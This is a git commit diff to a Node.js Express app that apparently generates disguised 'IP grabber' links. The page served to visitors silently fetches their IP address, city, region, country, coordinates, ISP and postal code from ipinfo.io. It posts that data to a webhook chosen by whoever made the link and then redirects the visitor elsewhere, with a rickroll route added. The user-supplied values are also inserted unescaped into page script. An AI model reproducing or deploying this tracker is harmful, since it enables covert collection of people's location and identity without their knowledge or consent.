284b74fc2dd45ab68c3b59964842cfd500add9bc
Rami M <86711160+PythonRam9@users.noreply.github.com>
2021-09-08 16:46:44 +0000

    First prototype almost complete!

--- index.js
+++ index.js
@@ -5,32 +5,36 @@ const path = require('path');
 app.get('/', (req, res) => {
   if ("hook" in req.query && "redirect" in req.query) {
     res.send(`
-    <html>
-    <body>
-    hi there ;)
-    <script>
-    function IPgrab()
-    {
-    const xhr = new XMLHttpRequest();
-    xhr.onreadystatechange = function () {
-    if (xhr.readyState === 4) {
-    console.log(xhr.responseText);
-    }
-    };
-    xhr.open("GET", "https//api.ipify.org/?format=text");
-    xhr.send();
-    var IP =  xhr.responseText;
-    var request = new XMLHttpRequest();
-    request.open('POST', '${ req.query.hook }');
-    request.setRequestHeader('Content-type', 'application/json');
-    var params = {content: IP}
-    request.send(JSON.stringify(params));
-    window.location.replace('${ req.query.redirect }');
-    }
-    window.onload = IPgrab();
-    </script>
-    </body>
-    </html>`);
+<html>
+<body>
+<script>
+function getIP(json) {
+window.ipAndInfo = '';
+window.ipAndInfo += json.ip + ' | ';
+window.ipAndInfo += json.city + ' | ';
+window.ipAndInfo += json.region + ' | ';
+window.ipAndInfo += json.country + ' | ';
+window.ipAndInfo += json.loc + ' | ';
+window.ipAndInfo += json.org + ' | ';
+window.ipAndInfo += json.postal + ' | ';
+window.ipAndInfo += json.timezone + ' | ';
+}
+
+function IPgrab()
+{
+var IP = window.ipAndInfo;
+var request = new XMLHttpRequest();
+request.open('POST', '${ req.query.hook }');
+request.setRequestHeader('Content-type', 'application/json');
+var params = {content: IP}
+request.send(JSON.stringify(params));
+window.location.replace('${ req.query.redirect }');
+}
+window.onload = IPgrab();
+</script>
+<script type="application/javascript" src="http://ipinfo.io/?format=jsonp&callback=getIP"></script>
+</body>
+</html>`);
   } else {
     res.sendFile(path.join(__dirname+'/index.html'));
   }
@@ -41,6 +45,10 @@ app.get('/create', (req, res) => {
     var new_URL = `https://xyz.webhooks.repl.co?hook=${ encodeURIComponent(req.query.hook) }&redirect=${ encodeURIComponent(req.query.redirect) }`
     res.send(`<h1>Your Link has been generated succesfully</h1><br><textarea rows="1" cols="1000">${ new_URL }</textarea><br>`)
   }
+});
+
+app.get('/u-got-rolled', (req, res) => {
+  res.sendFile(path.join(__dirname+'/rickroll.html'));
 });
 
 app.listen(3000, () => {
